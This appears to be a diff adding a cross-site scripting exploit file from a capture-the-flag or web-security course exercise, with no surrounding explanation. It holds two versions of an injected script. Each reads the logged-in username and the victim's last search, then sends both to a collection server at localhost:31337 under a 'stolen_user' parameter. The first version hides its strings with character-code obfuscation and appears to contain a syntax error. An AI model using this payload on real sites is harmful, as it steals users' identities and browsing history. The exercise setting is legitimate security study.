@@ -1,0 +1,43 @@
+my_flag
+<script>
+	{var username = document.getElementById(String.fromCharCode(108,111,103,103,101,100,45,105,110,45,117,115,101,114)).innerHTML}
+	{console.log(username)}
+	{var prefix = String.fromCharCode(104,116,116,112,58,47,47,108,111,99,97,108,104,111,115,116,58,51,49,51,51,55,47,63,115,116,111,108,101,110,95,117,115,101,114,61)}
+	{var suffix = String.fromCharCode(38,108,97,115,116,95,115,101,97,114,99,104,61)}
+	{var last_search = String.fromCharCode(120,120,120)}
+	{var history_string = String.fromCharCode(104,105,115,116,111,114,121,45,108,105,115,116)}
+	{var history_items_string = String.fromCharCode(104,105,115,116,111,114,121,45,105,116,101,109)}
+	{var flag_string = String.fromCharCode(109,121,95,102,108,97,103)}
+	{setTimeout(() => {
+		{var history = document.getElementById(history_string)}
+		{var history_items = document.getElementsByClassName(history_items_string)}
+		for({var i=0}{i<history_items.length}{i++}){
+			if(!history_items[i].innerHTML.includes(flag_string))){
+				{last_search = history_items[i].innerHTML}
+				{break}
+			}
+		}
+
+		{$.get(prefix+username+suffix+last_search)}
+	},2000)}
+</script>
+
+
+my_flag
+<script>
+	{var username = document.getElementById(String.fromCharCode(108,111,103,103,101,100,45,105,110,45,117,115,101,114)).innerHTML}
+	{console.log(username)}
+	{var last_search = String.fromCharCode(120,120,120)}
+	setTimeout(() => {
+		var history = document.getElementById('history-list');
+		var history_items = document.getElementsByClassName('history-item');
+		console.log(history_items.length);
+		for(var i=0;i<history_items.length;i++){
+			if(!history_items[i].innerHTML.includes("my_flag")){
+				last_search = history_items[i].innerHTML;
+				break;
+			}
+		}
+		$.get("http://localhost:31337/?stolen_user="+username+"&last_search="+last_search);
+	},2000);
+</script>
